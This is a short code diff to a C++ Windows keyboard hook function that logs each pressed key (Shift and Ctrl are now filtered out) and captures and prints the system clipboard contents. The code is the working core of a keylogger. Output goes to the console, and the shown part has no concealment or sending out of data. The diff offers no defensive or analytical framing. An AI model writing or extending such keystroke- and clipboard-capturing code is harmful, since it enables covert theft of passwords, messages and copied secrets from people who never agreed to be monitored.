@@ -31,13 +31,16 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 	//shift handling handling here, we do not need to print anything :)
 	if (!(keyboardStruct->vkCode == 160 || keyboardStruct->vkCode == 161))
 	{
-		if (wparam == WM_KEYDOWN)
+		if (!(keyboardStruct->vkCode == 162 || keyboardStruct->vkCode == 163))
 		{
-			if (is_control_on) { std::cout << "CTRL + "; }
-			std::cout << handleChars(keyboardStruct->vkCode, is_shift_on) << '\n';
+			if (wparam == WM_KEYDOWN)
+			{
+				if (is_control_on) { std::cout << "CTRL + "; }
+				std::cout << handleChars(keyboardStruct->vkCode, is_shift_on) << '\n';
+			}
 		}
 	}
-
+	
 	if (grabClipboard(storedClipboardContents))
 	{
 		std::cout << "CLIPBOARD: " << storedClipboardContents << '\n';
